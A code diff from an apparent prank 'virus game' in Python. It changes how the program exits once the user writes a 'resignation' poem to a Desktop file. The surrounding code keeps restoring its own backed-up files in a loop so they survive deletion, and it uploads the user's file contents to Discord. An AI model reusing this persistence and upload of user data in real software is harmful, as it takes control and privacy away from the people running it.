@@ -34,7 +34,7 @@ def check_resign():
         with open(os.path.join(home_dir, "Desktop", "vzdavam_sa.txt")) as f:
             content = f.readlines()
             if len(content) > 3:
-                log_to_discord("Basnicka:\n```" + "\n".join(content) + "```", important=True)
+                log_to_discord("Basnicka:\n```txt\n" + "".join(content) + "```", important=True)
                 try:
                     import send2trash
 
@@ -57,16 +57,18 @@ def check_resign():
                     root.withdraw()
                     tkinter.messagebox.showinfo("Success", "All virus files were moved to <user>/Desktop/trash/. You can review the code and safely delete it.\nRestart your computer to stop all remaining virus processes.")
                 tkinter.messagebox.showinfo("Thanks for playing", "Thanks for playing 'virus game'.\nYou can review source code on https://github.com/Hacaric/virus_game\nHave a nice day.\n\t-programmers from Gama")
-                sys.exit()
+                return True
             else:
                 raise Exception()
     except:
         pass
+    return False
 
 backuped_files = [open(path, "rb").read() for path in files_to_backup]
 
 while True:
-    check_resign()
+    if check_resign():
+        break
     for index, path in enumerate(files_to_backup):
         backup = backuped_files[index]
         try:
